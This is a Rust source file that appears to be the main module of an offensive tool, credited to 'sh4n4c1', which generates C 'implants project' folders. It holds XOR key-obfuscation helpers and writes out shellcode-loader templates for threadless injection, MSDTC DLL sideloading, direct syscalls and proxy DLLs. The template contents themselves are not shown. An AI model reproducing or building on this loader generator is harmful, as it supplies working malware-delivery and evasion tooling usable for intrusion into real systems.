pub mod clib;
pub mod config;

use console::style;
use std::fs::*;
use rand::{thread_rng, Rng};
use std::io::prelude::*;

pub const BANNER: &str = r#"
_\~ |-| +| |_ () /\ |) [- /? 
"#;

pub const KEY_SIZE: usize = 16;

pub enum LogLevel {
    Info,
    Debug,
    Success,
    Warning,
    Error,
}

pub fn banner(){
    println!("{}", style(BANNER).bold().red());
    println!("\t\t{}\n", style("coded by sh4n4c1").red());
}

pub fn printf_m(level: LogLevel, message: &str){
    use LogLevel::*;
    let prefix = match level {
        Success => format!("[{}]", style("+++").green().bold()),
        Debug => format!("[{}]", style("xxx").yellow()),
        Info => format!("[{}]", style("***").blue().bold()),
        Warning => format!("[{}]", style("!!!").yellow().bold()),
        Error => format!("[{}]", style("---").red().bold()),
    };
    println!("{} {}", prefix, message);
}

pub fn generate_random_key() -> Vec<u8> {
    let mut rng = thread_rng();
    let mut key = vec![0; KEY_SIZE];
    for i in 0..KEY_SIZE {
        key[i] = rng.gen_range(1..=u8::MAX);
    }
    key
}

pub fn generate_protected_key(hint_byte: u8, raw_key: &mut [u8]) -> Vec<u8> {
    let mut rng = thread_rng();
    let mut protected_key = vec![0; KEY_SIZE];
    let key_byte = rng.gen_range(1..=u8::MAX);

    raw_key[0] = hint_byte;

    for l in 0..KEY_SIZE {
        protected_key[l] = raw_key[l] ^ l as u8 ^ key_byte;
    }

    protected_key
}
pub fn hexdump_short(buffer: &[u8]) {
    let bytes_per_line = 16;

    for (i, chunk) in buffer.chunks(bytes_per_line).enumerate() {
        if i > 3{
            break;
        }
        print!("\t{:04x}  ", i * bytes_per_line);

        for byte in chunk {
            print!("{:02x} ", byte);
        }

        let padding = bytes_per_line - chunk.len();
        for _ in 0..padding {
            print!("   ");
        }

        print!(" |");
        for byte in chunk {
            if byte.is_ascii() && !byte.is_ascii_control() {
                print!("{}", *byte as char);
            } else {
                print!(".");
            }
        }
        println!("|");
    }
    println!("\t....");
}
pub fn hexdump(buffer: &[u8]) {
    let bytes_per_line = 16;

    for (i, chunk) in buffer.chunks(bytes_per_line).enumerate() {
        print!("\t{:04x}  ", i * bytes_per_line);

        for byte in chunk {
            print!("{:02x} ", byte);
        }

        let padding = bytes_per_line - chunk.len();
        for _ in 0..padding {
            print!("   ");
        }

        print!(" |");
        for byte in chunk {
            if byte.is_ascii() && !byte.is_ascii_control() {
                print!("{}", *byte as char);
            } else {
                print!(".");
            }
        }
        println!("|");
    }
}
pub fn get_c_arr(arr: &mut Vec<u8>) -> String{
    let mut result = String::new();
    for byte in arr {
        result.push_str(&format!("0x{:02X}, ", byte));
    }
    result.pop();
    result.pop();
    result
}
pub fn write_file(file_path: &str, buffer: &[u8]){
    let mut file = File::create(file_path).expect("failed to create implants project file");
    file.write_all(buffer).expect("failed to write to implants project file");
}
pub fn generate_output(output_path: &str){

    /* create implants project folder */
    create_dir_all(&output_path).expect("failed to create output folder");
    create_dir_all(format!("{}/include", &output_path)).expect("failed to create include folder");
    create_dir_all(format!("{}/src", &output_path)).expect("failed to create src folder");
    create_dir_all(format!("{}/src/asm", &output_path)).expect("failed to create asm folder");
    create_dir_all(format!("{}/src/method", &output_path))
        .expect("failed to create method folder");

    /* we write implants project file */
    use crate::clib::*;

    /* src folder */
    write_file(&format!("{}/src/main.c", output_path), main_c::MAIN_C.as_bytes());
    write_file(&format!("{}/src/proxycall.c", output_path), proxycall_c::PROXYCALL_C.as_bytes());
    write_file(&format!("{}/src/proxydll.c", output_path), proxydll_c::PROXYDLL_C.as_bytes());
    write_file(&format!("{}/src/web.c", output_path), web_c::WEB_C.as_bytes());
    write_file(&format!("{}/src/winapi.c", output_path), winapi_c::WINAPI_C.as_bytes());
    write_file(&format!("{}/src/common.c", output_path), common_c::COMMON_C.as_bytes());

    /* src/method folder */
    write_file(&format!("{}/src/method/kannshellcode.c", output_path), 
        kannshellcode_c::KANNSHELLCODE_C.as_bytes());
    write_file(&format!("{}/src/method/msdtc_dll_sideload.c", output_path), 
        msdtc_dll_sideload_c::MSDTC_DLL_SIDELOAD_C.as_bytes());
    write_file(&format!("{}/src/method/msdtc_dll_sideload.h", output_path), 
        msdtc_dll_sideload_h::MSDTC_DLL_SIDELOAD_H.as_bytes());
    write_file(&format!("{}/src/method/threadless_injection.c", output_path), 
        threadless_injection_c::THREADLESS_INJECTION_C.as_bytes());
    write_file(&format!("{}/src/method/threadless_injection.h", output_path), 
        threadless_injection_h::THREADLESS_INJECTION_H.as_bytes());

    /* src/asm folder */
    write_file(&format!("{}/src/asm/proxycall.s", output_path), 
        proxycall_s::PROXYCALL_S.as_bytes());
    write_file(&format!("{}/src/asm/proxydll.s", output_path), 
        proxydll_s::PROXYDLL_S.as_bytes());
    write_file(&format!("{}/src/asm/syscall.s", output_path), 
        syscall_s::SYSCALL_S.as_bytes());

    /* include folder */
    write_file(&format!("{}/include/macros.h", output_path), macros_h::MACROS_H.as_bytes());
    write_file(&format!("{}/include/proxydll.h", output_path), proxydll_h::PROXYDLL_H.as_bytes());
    write_file(&format!("{}/include/web.h", output_path), web_h::WEB_H.as_bytes());
    write_file(&format!("{}/include/winapi.h", output_path), winapi_h::WINAPI_H.as_bytes());
    write_file(&format!("{}/include/struct.h", output_path), struct_h::STRUCT_H.as_bytes());
    write_file(&format!("{}/include/proxycall.h", output_path), 
        proxycall_h::PROXYCALL_H.as_bytes());

    /* makefile */
    write_file(&format!("{}/makefile", output_path), makefile_::MAKEFILE_.as_bytes());

    /* sideload linker */
    write_file(&format!("{}/linker.def", output_path), linker_def::LINKER_DEF.as_bytes());
}
